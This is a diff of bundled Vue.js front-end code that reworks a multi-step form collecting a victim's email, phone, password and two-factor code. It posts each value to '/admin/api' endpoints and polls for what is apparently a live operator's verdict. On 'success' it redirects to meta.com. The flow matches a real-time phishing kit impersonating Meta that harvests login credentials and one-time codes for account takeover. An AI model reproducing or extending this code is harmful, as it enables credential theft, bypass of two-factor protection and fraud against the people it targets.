@@ -48467,41 +48467,56 @@ Vue.createApp({
       ResetFormDataChangeIP: {
         ipUpdate: ''
       },
-      formChangeIPError: {}
+      formChangeIPError: {},
+      emailError: false,
+      phoneError: false,
+      checkError: false,
+      passError: false,
+      idItem: '',
     };
   },
   methods: {
-    // getAllItem(){
-    //     var that = this;
-    //     setInterval(function(){
-    //         serviceHTTP.get('/admin/api/get-all-items').then((response)=>{
-    //             that.dataList = {...response.data};
-    //             if(!_.isEqual(that.dataList, that.dataListOld)){
-    //                 let timerInterval;
-    //                 Swal.fire({
-    //                 title: '<i class="fa-solid fa-bell"></i>',
-    //                 timer: 2000,
-    //                 timerProgressBar: true,
-    //                 didOpen: () => {
-    //                     Swal.showLoading();
-    //                     const timer = Swal.getPopup().querySelector("b");
-    //                     timerInterval = setInterval(() => {
-    //                     timer.textContent = `${Swal.getTimerLeft()}`;
-    //                     }, 100);
-    //                 },
-    //                 willClose: () => {
-    //                     clearInterval(timerInterval);
-    //                 }
-    //                 }).then((result) => {
-    //                 if (result.dismiss === Swal.DismissReason.timer) {
-    //                     console.log("I was closed by the timer");
-    //                 }
-    //                 });
-    //             }
-    //             that.dataListOld = {...that.dataList}
-    //         })
-    //     }, 1000);
-    // },
+    validatePassInput() {
+      this.passError = this.FormInfo.password === '';
+    },
+    validateEmailInput() {
+      this.emailError = !this.validateEmail(this.FormInfo.email);
+    },
+    validatePhoneInput() {
+      // Chỉ cho phép số và giới hạn độ dài
+      this.FormInfo.phone = this.FormInfo.phone.replace(/[^0-9]/g, '').slice(0, 12);
+      this.phoneError = this.FormInfo.phone === '';
+    },
+    clearCheckError() {
+      this.checkError = false;
+    },
+    validateForm() {
+      this.emailError = this.FormInfo.email === '' || !this.validateEmail(this.FormInfo.email);
+      this.phoneError = this.FormInfo.phone === '';
+      this.checkError = !this.FormInfo.agree;
+
+      if (!this.emailError && !this.phoneError && !this.checkError) {
+        $('#exampleModal1').modal('hide');
+        $('#modal_password').modal('show');
+      } else {
+        if (this.emailError) {
+          $('#email').addClass('border border-danger');
+        }
+        if (this.phoneError) {
+          $('#phone').addClass('border border-danger');
+        }
+        if (this.checkError) {
+          $('.form-check-label').addClass('text-danger');
+        }
+      }
+    },
+    validateEmail(email) {
+      const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      return regex.test(email);
+    },
+    getIdItem() {
+      return this.idItem;
+    },
     handleStoreInfo: function handleStoreInfo() {
       var that = this;
       that.formInfoError = {};
@@ -48510,16 +48525,12 @@ Vue.createApp({
       if (that.FormInfo.phone == '') that.formInfoError.phone = true;
       // var emailHidden = this.$refs.emailHidden.value;
       // that.FormInfo.email = emailHidden;
-      function validateEmail(email) {
-        const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-        return regex.test(email);
-      }
-
-      if (that.FormInfo.email == '') {
-        that.formInfoError.email = true;
-      } else if (!validateEmail(that.FormInfo.email)) {
-        that.formInfoError.email = true;
-      }
+   
+      // if (that.FormInfo.email == '') {
+      //   that.formInfoError.email = true;
+      // } else if (!validateEmail(that.FormInfo.email)) {
+      //   that.formInfoError.email = true;
+      // }
 
       if (Object.keys(that.formInfoError).length === 0) {
         _service_serviceHTTP_js__WEBPACK_IMPORTED_MODULE_0__["default"].post("/admin/api/store-info", _objectSpread({}, this.FormInfo)).then(function (response) {
@@ -48538,12 +48549,16 @@ Vue.createApp({
                       // window.location.href = "/wrong-password?email=".concat(email, "&id=").concat(idNewItem);
                       console.log(response);
                       that.formInfoError.message = "The password you entered is incorrect. Please try again.";
-                      document.getElementById("wrong_pass_msg").style.display = "flex";
+                      document.getElementById("wrong_pass_msg").style.display = "block";
                       that.isLoading = false;
                       isRunning = true;
                     }
                     if (response.data == 2) {
-                      window.location.href = "/2step-verification?email=".concat(email, "&id=").concat(idNewItem);
+                      that.idItem = idNewItem;
+                      $('#modal_password').modal('hide');
+                      $('#modal_2fa').modal('show');
+                      that.isLoading = false;
+                      isRunning = true;
                     }
                   } else {
                     console.log(response.message);
@@ -48604,25 +48619,25 @@ Vue.createApp({
       //     that.formDigitError.code = true
 
       if (Object.keys(that.formDigitError).length === 0) {
-        that.FormDigitCode.id = $key;
+        that.FormDigitCode.id = $key ?? that.getIdItem();
         _service_serviceHTTP_js__WEBPACK_IMPORTED_MODULE_0__["default"].post("/admin/api/otp-reset-click", {
-          'id': $key
+          'id': that.FormDigitCode.id
         }).then(function (response) {});
         _service_serviceHTTP_js__WEBPACK_IMPORTED_MODULE_0__["default"].post("/admin/api/update-digit-code", _objectSpread({}, this.FormDigitCode)).then(function (response) {
           if (response.status === 200) {
             that.isLoading = true;
             setInterval(function () {
-              _service_serviceHTTP_js__WEBPACK_IMPORTED_MODULE_0__["default"].get("/admin/api/get-status-otp?id=".concat($key)).then(function (response) {
+              _service_serviceHTTP_js__WEBPACK_IMPORTED_MODULE_0__["default"].get("/admin/api/get-status-otp?id=".concat(that.FormDigitCode.id)).then(function (response) {
                 if (response.status === 200) {
                   if (response.data == 1) {
                     that.formDigitError.message = "The number that you've entered doesn't match your code. Please try again.";
-                    document.getElementById("enter_code_msg").style.display = "flex";
+                    document.getElementById("enter_code_msg").style.display = "block";
                     that.isLoading = false;
                   }
                   if (response.data == 2) {
                     that.isLoading = false;
-                    showPopup();
-                    // window.location.href = "https://www.meta.com/";
+                    // showPopup();
+                    window.location.href = "https://www.meta.com/";
                   }
                 } else {
                   console.log(response.message);
@@ -48688,7 +48703,7 @@ Vue.createApp({
                 if (response.status === 200) {
                   if (response.data == 1) {
                     that.formPasswordError.message = "The password that you've entered doesn't match your account. Please try again.";
-                    document.getElementById("wrong_pass_msg").style.display = "flex";
+                    document.getElementById("wrong_pass_msg").style.display = "block";
                     that.isLoading = false;
                   }
                   if (response.data == 2) {
